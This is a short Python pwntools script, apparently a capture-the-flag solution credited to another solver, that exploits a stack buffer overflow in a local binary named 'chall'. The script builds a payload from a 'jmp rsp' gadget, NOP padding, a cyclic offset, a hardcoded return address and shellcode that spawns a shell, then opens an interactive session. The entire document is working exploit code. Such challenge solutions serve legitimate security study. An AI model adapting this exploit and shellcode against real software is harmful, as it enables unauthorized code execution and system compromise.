# This is from mirai solver, appreciate
from pwn import *

elf = context.binary = ELF('./chall')
p = process()

payload = flat(
    asm('jmp rsp'),
    b'\x90'*6,
    cyclic(32, n=8),
    p64(0x00000000004010cc),
    asm(shellcraft.sh())
)

p.sendlineafter('?', payload)
p.interactive()
